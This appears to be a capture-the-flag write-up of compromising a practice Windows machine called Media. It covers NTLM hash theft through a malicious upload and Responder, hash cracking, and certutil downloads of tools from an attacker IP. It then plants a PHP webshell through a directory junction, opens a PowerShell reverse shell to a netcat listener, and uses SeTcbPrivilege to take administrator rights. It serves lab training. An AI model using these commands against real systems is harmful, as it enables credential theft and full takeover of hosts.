## Enumeration

We start our enumeration with an Nmap scan. Since we have no credentials, the HTTP service is the most interesting attack surface to investigate.

```text
22/tcp   open  ssh   OpenSSH for_Windows_9.5
80/tcp   open  http  Apache httpd 2.4.56 / PHP 8.1.17
3389/tcp open  rdp   Microsoft Terminal Services
```

Browsing to the website reveals an upload function. A test upload returns a message indicating that someone on the team will review the submission. This suggests that an employee or automated process may access uploaded files, making NTLM theft worth testing.

## NTLM Theft

We use `ntlm_theft` to generate an ASX file that can trigger an outbound authentication attempt when accessed by Windows Media Player.

```bash
python3 ntlm_theft.py -g asx -s 10.10.14.106 -f /home/kali/Boxes/Media/intro
```

We then start Responder:

```bash
sudo responder -I tun0
```

After uploading the malicious file, we receive a NetNTLMv2 challenge-response for the `enox` account.

```text
[SMB] NTLMv2-SSP Client   : 10.129.45.91
[SMB] NTLMv2-SSP Username : MEDIA\\enox
[SMB] NTLMv2-SSP Hash     : enox::MEDIA:17ca7a482df5179e:1DF02EEF45C42F <redacted>
```

We can crack the captured NetNTLMv2 hash with Hashcat:

```powershell
PS C:\hashcat-7.1.2> .\hashcat.exe -m 5600 .\media.hash .\rockyou.txt

enox:<redacted>
```

The recovered credentials allow us to authenticate over SSH and obtain the user flag.

## Upload Path Enumeration

After gaining access as `enox`, we transfer `winPEAS` to the host for privilege-escalation enumeration.

```cmd
certutil -urlcache -split -f http://10.10.14.106:8001/winPEAS.exe C:\Users\enox\Desktop\winPEAS.exe
```

`winPEAS` does not reveal an obvious escalation path, so we return to the web application and inspect the upload handler in `index.php`.

The application stores uploads under:

```php
$uploadDir = 'C:/Windows/Tasks/Uploads/';
```

It then generates the directory name from an MD5 hash of the supplied first name, last name, and email address:

```php
$folderName = md5($firstname . $lastname . $email);
$targetDir = $uploadDir . $folderName . '/';
```

The uploaded filename is sanitized, but the destination directory itself is predictable because we control all three input values.

For example:

```text
Firstname: foo
Lastname:  bar
Email:     foo@bar.com
```

```bash
echo -n 'foobarfoo@bar.com' | md5sum
beefb40925db9ee54560bb7f90d37d0d  -
```

Checking the existing upload directories shows that they are owned by `NT AUTHORITY\LOCAL SERVICE` and that our `enox` account has Full Control over the relevant path.

```powershell
PS C:\Windows\Tasks\Uploads\6155a271368fa14d3dd084f08bf3daca> get-acl * | select owner

Owner
-----
NT AUTHORITY\LOCAL SERVICE
```

`icacls` also shows Full Control inherited by Everyone on the upload directories.

## Directory Junction Abuse

The upload application writes files directly into the MD5-derived directory. Since we control the directory name and have permission to create entries under the upload directory, we can redirect one of these paths using a Windows directory junction.

A junction can make a directory path resolve to another directory. We create one using the MD5 value calculated above, pointing it at Apache's document root:

```powershell
New-Item -ItemType Junction `
  -Path "C:\Windows\Tasks\Uploads\beefb40925db9ee54560bb7f90d37d0d" `
  -Target "C:\xampp\htdocs"
```

Alternatively, from CMD:

```cmd
mklink /J C:\Windows\Tasks\Uploads\beefb40925db9ee54560bb7f90d37d0d C:\xampp\htdocs
```

We can now submit another application using the same `firstname`, `lastname`, and `email` values. The application follows the junction when writing the uploaded file, causing it to be placed in `C:\xampp\htdocs`.

This lets us upload a PHP webshell that is then reachable through Apache.

```bash
curl "http://media.htb/shell.php?cmd=whoami"
```

```text
nt authority\local service
```

## Getting a Shell

We use the webshell to obtain a PowerShell reverse shell.

On the attack machine:

```bash
nc -lnvp 4445
```

Then trigger the encoded PowerShell payload through the webshell:

```bash
curl "http://media.htb/shell.php?cmd=powershell%20<base64>"
```

We receive a shell as `NT AUTHORITY\LOCAL SERVICE`.

## SeTcbPrivilege

Checking the privileges of the service account reveals `SeTcbPrivilege`:

```powershell
PS C:\xampp\htdocs> whoami /priv

PRIVILEGES INFORMATION

Privilege Name                Description                         State
============================= =================================== ========
SeTcbPrivilege                Act as part of the operating system Disabled
SeChangeNotifyPrivilege       Bypass traverse checking            Enabled
SeCreateGlobalPrivilege       Create global objects               Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

`SeTcbPrivilege` allows a process to act as part of the operating system and is highly privileged. We can leverage it with the `TcbElevation` PoC.

We download the binary to the target:

```cmd
certutil -urlcache -split -f http://10.10.14.106:8001/TcbElevation-x64.exe C:\xampp\htdocs\TcbElevation.exe
```

Rather than spawning another elevated shell, we can use the elevated token to add `enox` to the local Administrators group:

```powershell
.\TcbElevation.exe elevate 'net localgroup Administrators enox /add'
```

We verify the result:

```powershell
PS C:\xampp\htdocs> net localgroup Administrators

Alias name     Administrators

Members
-------------------------------------------------------------------------------
Administrator
enox
```

After starting a new SSH session, the updated group membership is reflected in our access token. We can then access the administrator's desktop and retrieve the root flag.

```cmd
enox@MEDIA C:\Users\Administrator\Desktop> type root.txt
a9a7182f125<redacted>
```
